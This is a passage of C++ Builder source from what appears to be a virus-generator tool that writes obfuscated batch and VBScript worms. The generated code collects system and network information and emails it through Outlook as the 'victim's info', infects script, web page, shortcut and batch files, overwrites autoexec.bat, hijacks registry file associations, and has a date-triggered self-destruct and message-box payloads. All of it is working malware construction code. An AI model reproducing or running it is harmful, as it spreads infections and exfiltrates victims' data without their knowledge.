            wstf(CaseRand("echo")+" " + emn1 + ".close>>%"+CaseRand("tmp")+"%\\" + emnv + ".vbs" + ffos);
            wstf("cscript %"+CaseRand("tmp")+"%\\" + emnv + ".vbs>nul" + ffos);
            wstf("ver /r>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("vol>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("keyb>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("chcp>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf(CaseRand("set")+">>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("mem /d /a>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("ipconfig /all>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("net ver>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("net config /yes>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("net diag /status>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("net view>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("netstat -a -e -r>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
            wstf("netstat -a -e -r -p udp>>%"+CaseRand("tmp")+"%\\" + emni + ".txt" + ffos);
        }
        if (Form15->CheckBox56->Checked == true)
        {
            wstf(CaseRand("echo")+" if " + wshl + "."+CaseRand("regread")+"(\"HKCU\\Software\\" + plrn + "\\"+emnk+"\")=\"\" then>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
            wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\"+emnk+"\","+emnw+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        }
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msoa + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"outlook.application\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" "+CaseRand("set")+" " + msci + "=" + msoa + ".createitem(0)>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" dim " + mnfv + ">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        int mntat = 20;
        for (int c=1; c<=Form15->Edit8->Text.Length(); c++)
        {
            if (mntat == 20)
            {
                if (c != 1) wstf(">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
                wstfnr(CaseRand("echo")+" "+mnfv+"="+mnfv+"&chr("+AnsiString(int(Form15->Edit8->Text[c]))+")");
                mntat = 1;
            }
            else
            {
                wstfnr("&chr("+AnsiString(int(Form15->Edit8->Text[c]))+")");
                mntat = mntat+1;
            }
        }
        if (mntat > 1) wstf(">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".to="+mnfv+">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".subject=\"Your "+Form15->Label29->Caption+" Strikes! Congrats, " + Form15->Edit2->Text + "!\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox55->Checked == true) wstf(CaseRand("echo")+" " + msci + ".body=\"Check "+emni+".txt attachment for victim's info!!!\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        else wstf(CaseRand("echo")+" " + msci + ".body=\"Some randoms... "+mnra+"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox55->Checked == true) wstf(CaseRand("echo")+" " + msci + ".attachments.add(\"%"+CaseRand("tmp")+"%\\" + emni + ".txt\")>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox55->Checked == true) wstf(CaseRand("echo")+" " + msci + ".deleteaftersubmit=true>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msci + ".send>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + msoa + ".quit>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (Form15->CheckBox56->Checked == true) wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
    }
    wstf("cscript %"+CaseRand("tmp")+"%\\" + tmpw + ".vbs>nul" + ffos);
    AnsiString ias1 = Infstr(istd+"\\" + tmpn + ".bat", "%%"+dfrv+"", infn);
    AnsiString iasl = Infstr("%"+CaseRand("tmp")+"%\\" + lfds + ".lnk", "%%"+dfrv+"", infn);
    AnsiString iasp = Infstr("%"+CaseRand("tmp")+"%\\" + pfds + ".pif", "%%"+dfrv+"", infn);
    AnsiString infp = "for %%"+dfrv+" in (" + infd + ") do " + iasp;
    AnsiString infl = "for %%"+dfrv+" in (" + infd + ") do " + iasl;
    AnsiString inf1 = "for %%"+dfrv+" in (" + infd + ") do " + ias1;
    AnsiString inf2 = "for %%"+dfrv+" in (" + infd + ") do call %0 " + pari + " %%"+dfrv+"";
    AnsiString inf3 = "for %%"+dfrv+" in (" + infd + ") do attrib -r %%"+dfrv+"";
    if (Form15->CheckBox24->Checked == true) wstf(ffos + CaseRand("set")+" " + ebds + "=%"+CaseRand("windir")+"%\\command\\ebd");
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox11->Checked == true)
    {
        wstf(ffos + CaseRand("set")+" " + exts + "=bat");
        wstf(inf3 + ffos);
        if (infn == 1)
        {
            wstf(inf1 + ffos);
        }
        else wstf(inf2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox38->Checked == true)
    {
        wstf(ffos + CaseRand("set")+" " + exts + "=cmd");
        wstf(inf3 + ffos);
        if (infn == 1)
        {
            wstf(inf1 + ffos);
        }
        else wstf(inf2 + ffos);
    }
    AnsiString iash = Infstr("%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"", "%%"+dfrv+"", infn);
    AnsiString infh = "for %%"+dfrv+" in (" + infd + ") do " + iash;
    AnsiString infh2= "for %%"+dfrv+" in (" + infd + ") do call %0 " + paih + " %%"+dfrv+"";
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox36->Checked == true)
    { // htm infection
        wstf(ffos + CaseRand("set")+" " + exts + "=htm" + ffos);
        wstf(inf3 + ffos);
        if (infn == 1)
        {
            wstf(infh + ffos);
        }
        else wstf(infh2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox51->Checked == true)
    { // html infection
        wstf(ffos + CaseRand("set")+" " + exts + "=html" + ffos);
        wstf(inf3 + ffos);
        if (infn == 1)
        {
            wstf(infh + ffos);
        }
    else wstf(infh2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox52->Checked == true)
    { // asp infection
    wstf(ffos + CaseRand("set")+" " + exts + "=asp" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infh + ffos);
    }
    else wstf(infh2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox58->Checked == true)
    { // cgi infection
    wstf(ffos + CaseRand("set")+" " + exts + "=cgi" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infh + ffos);
    }
    else wstf(infh2 + ffos);
    }
    AnsiString iasj = Infstr(istd+"\\" + istj + ".js", "%%"+dfrv+"", infn);
    AnsiString infj = "for %%"+dfrv+" in (" + infd + ") do " + iasj;
    AnsiString infj2= "for %%"+dfrv+" in (" + infd + ") do call %0 " + paij + " %%"+dfrv+"";
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox19->Checked == true)
    { // js infection
    wstf(ffos + CaseRand("set")+" " + exts + "=js" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infj + ffos);
    }
    else wstf(infj2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox26->Checked == true)
    { // jse infection
    wstf(ffos + CaseRand("set")+" " + exts + "=jse" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infj + ffos);
    }
    else wstf(infj2 + ffos);
    }
    AnsiString iasv = Infstr(istd+"\\" + istv + ".vbs", "%%"+dfrv+"", infn);
    AnsiString infv = "for %%"+dfrv+" in (" + infd + ") do " + iasv;
    AnsiString infv2= "for %%"+dfrv+" in (" + infd + ") do call %0 " + paiv + " %%"+dfrv+"";
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox12->Checked == true)
    { // vbs infection
    wstf(ffos + CaseRand("set")+" " + exts + "=vbs" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infv + ffos);
    }
    else wstf(infv2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox25->Checked == true)
    { // vbe infection
    wstf(ffos + CaseRand("set")+" " + exts + "=vbe" + ffos);
    wstf(inf3 + ffos);
    if (infn == 1)
    {
        wstf(infv + ffos);
    }
    else wstf(infv2 + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox20->Checked == true)
    {
        wstf(ffos + CaseRand("set")+" " + exts + "=lnk");
        wstf(inf3 + ffos);
        wstf(infl + ffos);
    }
    if (Form15->CheckBox44->Checked == false && Form15->CheckBox14->Checked == true)
    {
        wstf(ffos + CaseRand("set")+" " + exts + "=pif");
        wstf(inf3 + ffos);
        wstf(infp + ffos);
    }
    if (Form15->CheckBox31->Checked == true)
    {
        wstf("%comspec% /f /c attrib -r -s -h A:\\autoexec.bat" + ffos);
        if (infn == 1)
            wstf("%comspec% /f /c copy "+istd+"\\" + tmpn + ".bat A:\\autoexec.bat /y" + ffos);
        else
            wstf("%comspec% /f /c type "+istd+"\\" + tmpn + ".bat>>A:\\autoexec.bat" + ffos);
    }
    if (Form15->CheckBox62->Checked == true)
    {
        wstf("md \\" + subd + ffos);
        wstf("copy "+istd+"\\" + tmpn + ".bat \\" + subd + "\\" + subf + ".bat /y" + ffos);
        wstf("subst " + subc + ": \\" + subd + ffos);
    }
    if (Form15->CheckBox41->Checked == true)
    {
        wstf("goto " + la3e);
        wstf(":" + lafb);
        wstf(CaseRand("echo")+" " + tfpe + ">>%1" + tfpx + ffos);
        wstf("goto " + labf);
        wstf(":" + la3e);
    }
    if (Form15->CheckBox53->Checked == true)
    {   // self destruction
    wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
    wstf(CaseRand("echo")+" "+CaseRand("set")+" " + sdfv + "=w%" + vbih + "%."+CaseRand("createobject")+"(\"%" + vbih + "%ing.filesystemobject\")>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
    if (Form15->RadioButton10->Checked == true)
    {                   
        wstf(CaseRand("echo")+" dim " + sdv1 + ", " + sdv2 + ", " + sdv3 + ">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + sdv1 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +sdk1+ "\"))>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + sdv2 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +sdk2+ "\"))>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + sdv3 + "=int(" + wshl + "."+CaseRand("regread")+" (\"HKCU\\Software\\" + plrn + "\\" +sdk3+ "\"))>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if (not(int(" + sdv3 + ")=day(now)) or not(int(" + sdv2 + ")=month(now))) then>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + sdv1 + "=" + sdv1 + "+1>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" if (" + sdv1 + "=" + Form15->ComboBox3->Text + ") then>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox34->Checked == true)
            wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox5->Text + "\\" + rg1k + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox35->Checked == true)
            wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKCU\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox6->Text + "\\" + rg2k + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox7->Checked == true)
            wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKLM\\Software\\Microsoft\\Active setup\\Installed Components\\KeyName\\StubPath\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox15->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\exe%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox16->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\com%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox17->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\bat%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox18->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\pif%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox1->Checked == true)  wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\cmd%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox40->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\scr%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (kk2) wstf(CaseRand("echo")+" " + sdfv + ".deletefile(" + tmps + ".SpecialFolders(\"Startup\")&\"\\" + sfr3 + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        else wstf(CaseRand("echo")+" " + sdfv + ".deletefile(" + tmps + ".SpecialFolders(\"AllUsersStartup\")& \"\\" + sfr4 + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".run \""+istd+"\\" + tmpn + ".bat " + prsd + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + sdk2 + "\",month(now)>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + sdk3 + "\",day(now)>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + "."+CaseRand("regwrite")+" \"HKCU\\Software\\" + plrn + "\\" + sdk1 + "\"," + sdv1 + ">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
    }
    if (Form15->RadioButton11->Checked == true)
    {
        wstf(CaseRand("echo")+" if day(now)=" + Form15->ComboBox9->Text + " and month(now)=" + sdam + " and year(now)=20" + Form15->ComboBox11->Text + " then>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox34->Checked == true)
            wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKLM\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox5->Text + "\\" + rg1k + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox35->Checked == true)
            wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKCU\\"+CaseRand("Software\\Microsoft\\Windows\\Curren\"&chr(115+1)&\"Version")+"\\" + Form15->ComboBox6->Text + "\\" + rg2k + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox7->Checked == true)
        wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regdelete")+" \"HKLM\\Software\\Microsoft\\Active setup\\Installed Components\\KeyName\\StubPath\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox15->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\exe%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox16->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\com%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox17->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\bat%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox18->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\pif%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox1->Checked == true)  wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\hta%" + rsss + "%d\\\",\"\"\"%%1\"\" %%*\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        if (Form15->CheckBox40->Checked == true) wstf(CaseRand("echo")+" " + tmps + "."+CaseRand("regwrite")+" \"HKCR\\scr%" + rsss + "%d\\\",\""+istd+"\\" + rssv + ".vbs \"\"%%1 %%*\"\"\">>%"+CaseRand("tmp")+"%\\" + tmpw + ".vbs" + ffos);
        if (kk2) wstf(CaseRand("echo")+" " + sdfv + ".deletefile(" + tmps + ".SpecialFolders(\"Startup\")&\"\\" + sfr3 + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        else wstf(CaseRand("echo")+" " + sdfv + ".deletefile(" + tmps + ".SpecialFolders(\"AllUsersStartup\")& \"\\" + sfr4 + ".vbs\")>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" " + wshl + ".run \""+istd+"\\" + tmpn + ".bat " + prsd + "\">>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
        wstf(CaseRand("echo")+" end if>>%"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
    }
    wstf(CaseRand("echo")+" start wscript %"+CaseRand("tmp")+"%\\" + sdvw + ".vbs" + ffos);
    }
    if (Form15->CheckBox53->Checked == true)
    {   // self destruction
        wstf("goto " + lsd2);
        wstf(":" + lasd);
        wstf("del "+istd+"\\" + istv + ".vbs" + ffos);
        wstf("del "+istd+"\\" + istj + ".js" + ffos);
    if (Form15->CheckBox5->Checked == true)
    {
        wstf("find /v /i \"[boot]\"<%"+CaseRand("windir")+"%\\system.ini>%"+CaseRand("tmp")+"%\\" + sis1 + "."+tfre+"" + ffos);
        wstf("find /v /i \"shell=explorer.exe\"<%"+CaseRand("tmp")+"%\\" + sis1 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + sis2 + "."+tfre+"" + ffos);
        wstf("del %"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf(CaseRand("echo")+" [boot]>%"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf(CaseRand("echo")+" Shell=Explorer.exe>>%"+CaseRand("windir")+"%\\system.ini" + ffos);
        wstf("type %"+CaseRand("tmp")+"%\\" + sis2 + "."+tfre+">>%"+CaseRand("windir")+"%\\system.ini" + ffos);
    }
    if (Form15->CheckBox4->Checked == true)
    {
        wstf("find /v /i \"[windows]\"<%"+CaseRand("windir")+"%\\win.ini>%"+CaseRand("tmp")+"%\\" + wis1 + "."+tfre+"" + ffos);
        wstf("find /v /i \"load=\"<%"+CaseRand("tmp")+"%\\" + wis1 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+"" + ffos);
        wstf("find /v /i \"run=\"<%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+"" + ffos);
        wstf("find /v /i \"NullPort=\"<%"+CaseRand("tmp")+"%\\" + wis2 + "."+tfre+">%"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+"" + ffos);
        wstf("del %"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf(CaseRand("echo")+" [windows]>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf(CaseRand("echo")+" load=>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf(CaseRand("echo")+" run=>>%"+CaseRand("windir")+"%\\win.ini" + ffos);
        wstf("type %"+CaseRand("tmp")+"%\\" + wis3 + "."+tfre+">>%"+CaseRand("windir")+"%\\win.ini" + ffos);
    }
    if (Form15->CheckBox3->Checked == true)
    {
        wstf("find /v \""+istd+"\\" + dosd + "\\" + autn + "\"<\\autoexec.bat>%"+CaseRand("tmp")+"%\\"+sdtf+"."+tfre+"" + ffos);
        wstf("del \\autoexec.bat" + ffos);
        wstf("copy %"+CaseRand("tmp")+"%\\"+sdtf+"."+tfre+" \\autoexec.bat" + ffos);
    }
    if (Form15->CheckBox6->Checked == true)
    {
        wstf("find /v \""+istd+"\\" + dosd + "\\" + wstn + "\"<%"+CaseRand("windir")+"%\\winstart.bat>%"+CaseRand("tmp")+"%\\"+sdtf+"."+tfre+"" + ffos);
        wstf("del %"+CaseRand("windir")+"%\\winstart.bat" + ffos);
        wstf("copy %"+CaseRand("tmp")+"%\\"+sdtf+"."+tfre+" %"+CaseRand("windir")+"%\\winstart.bat" + ffos);
    }
    if (Form15->CheckBox3->Checked == true || Form15->CheckBox6->Checked == true)
    {
        wstf("erase "+istd+"\\" + dosd + "\\*.bat" + ffos);
        wstf("rd "+istd+"\\" + dosd + ffos);
    }
    if (Form15->CheckBox62->Checked == true)
    {
        wstf("del \\" + subd + "\\" + subf + ".bat /y" + ffos);
        wstf("s ubst /d " + subc + ":" + ffos);
        wstf("rd \\" + subd + ffos);
    }
    wstf("attrib -r -s -h "+istd+"\\" + tmpn + ".bat" + ffos);
    wstf("del "+istd+"\\" + tmpn + ".bat" + ffos);
    wstf("goto " + labf);
    wstf(":" + lsd2);
    }
    AnsiString ihs2 = Infstr("%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"", "%2", infn);
    AnsiString ihs3 = Infstr("%"+CaseRand("tmp")+"%\\" + htmt + "."+tfre+"", "%"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+"", infn);
    if (Form15->CheckBox44->Checked == false && (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)&&(Form15->CheckBox36->Checked == true || Form15->CheckBox51->Checked == true || Form15->CheckBox52->Checked == true || Form15->CheckBox58->Checked == true))
    { // htm-html-asp-cgi routine
    wstf("goto " + lenh);
    wstf(":" + lavh);
    if (Form15->RadioButton5->Checked == true) wstf("copy %2 %"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+" /y" + ffos);
    wstf(CaseRand("echo")+".|type %2|find \"" + vbif + "\">nul");
    if (Form15->RadioButton2->Checked == true)
        wstf("if errorlevel 1 " + ihs2 + ffos);
    else
        wstf("if errorlevel 1 " + ihs3 + ffos);
    wstf("goto " + labf);
    wstf(":" + lenh);
    }
    AnsiString ijs2 = Infstr(""+istd+"\\" + istj + ".js", "%2", infn);
    AnsiString ijs3 = Infstr(""+istd+"\\" + istj + ".js", "%"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+"", infn);
    if (Form15->CheckBox44->Checked == false && (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)&&(Form15->CheckBox19->Checked == true || Form15->CheckBox26->Checked == true))
    { // js-jse routine
    wstf("goto " + lenj);
    wstf(":" + lavj);
    if (Form15->RadioButton5->Checked == true) wstf("copy %2 %"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+" /y" + ffos);
    wstf(CaseRand("echo")+".|type %2|find \"" + fffr + "\">nul");
    if (Form15->RadioButton2->Checked == true)
        wstf("if errorlevel 1 " + ijs2 + ffos);
    else
        wstf("if errorlevel 1 " + ijs3 + ffos);
    wstf("goto " + labf);
    wstf(":" + lenj);
    }
    AnsiString ivs2 = Infstr(""+istd+"\\" + istv + ".vbs", "%2", infn);
    AnsiString ivs3 = Infstr(""+istd+"\\" + istv + ".vbs", "%"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+"", infn);
    if (Form15->CheckBox44->Checked == false && (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)&&(Form15->CheckBox12->Checked == true || Form15->CheckBox25->Checked == true))
    { // vbs-vbe routine
    wstf("goto " + lenv);
    wstf(":" + lavv);
    if (Form15->RadioButton5->Checked == true) wstf("copy %2 %"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+" /y" + ffos);
    wstf(CaseRand("echo")+".|type %2|find \"" + vbif + "\">nul");
    if (Form15->RadioButton2->Checked == true)
        wstf("if errorlevel 1 " + ivs2 + ffos);
    else
        wstf("if errorlevel 1 " + ivs3 + ffos);
    wstf("goto " + labf);
    wstf(":" + lenv);
    }
    AnsiString ias2 = Infstr(""+istd+"\\" + tmpn + ".bat", "%2", infn);
    AnsiString ias3 = Infstr(""+istd+"\\" + tmpn + ".bat", "%"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+"", infn);
    if (Form15->CheckBox44->Checked == false && (Form15->RadioButton2->Checked == true || Form15->RadioButton5->Checked == true)&&(Form15->CheckBox11->Checked == true || Form15->CheckBox38->Checked == true))
    { // bat-cmd routine
    wstf("goto " + labe);
    wstf(":" + labv);
    if (Form15->RadioButton5->Checked == true) wstf("copy %2 %"+CaseRand("tmp")+"%\\" + ovft + "."+tfre+" /y" + ffos);
    wstf(CaseRand("echo")+".|type %2|find \"" + fffr + "\">nul");
    if (Form15->RadioButton2->Checked == true)
        wstf("if errorlevel 1 " + ias2 + ffos);
    else
        wstf("if errorlevel 1 " + ias3 + ffos);
    wstf("goto " + labf);
    wstf(":" + labe);
    }
    if (Form15->CheckBox42->Checked == true || Form15->CheckBox45->Checked == true)
    {
    wstf("goto " + la2e);
    wstf(":" + labp);
    if (Form15->CheckBox39->Checked == true)
    { // msgbox
        wstf(CaseRand("echo")+".on error resume next>%"+CaseRand("tmp")+"%\\" + pymv + ".vbs" + ffos);
        if (Form15->CheckBox72->Checked) wstf(CaseRand("echo")+" do>>%"+CaseRand("tmp")+"%\\" + pymv + ".vbs" + ffos);
        wstf(CaseRand("echo")+" Msgbox \"" + Form15->Edit13->Text + "\","+ msgp +",\"" + Form15->Edit3->Text + "\">>%"+CaseRand("tmp")+"%\\" + pymv + ".vbs" + ffos);
        if (Form15->CheckBox72->Checked) wstf(CaseRand("echo")+" loop>>%"+CaseRand("tmp")+"%\\" + pymv + ".vbs" + ffos);
        wstf(CaseRand("wscript")+" %"+CaseRand("tmp")+"%\\" + pymv + ".vbs" + ffos);
    }
    if (Form15->CheckBox70->Checked == true)
    { // run file
        wstf("find /i /v \"run\"<%"+CaseRand("tmp")+"%\\" + tmpv + "."+tfre+">%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        if (Form15->ComboBox14->Text=="Infinite") wstf(CaseRand("echo")+" do>>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        else
        {
            wstf(CaseRand("echo")+" dim "+ pyrn +">>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
            wstf(CaseRand("echo")+" for "+ pyrn +"=1 to "+Form15->ComboBox14->Text+">>%"+CaseRand("tmp")+"%\\" + pyrv + ".vbs" + ffos);
        }
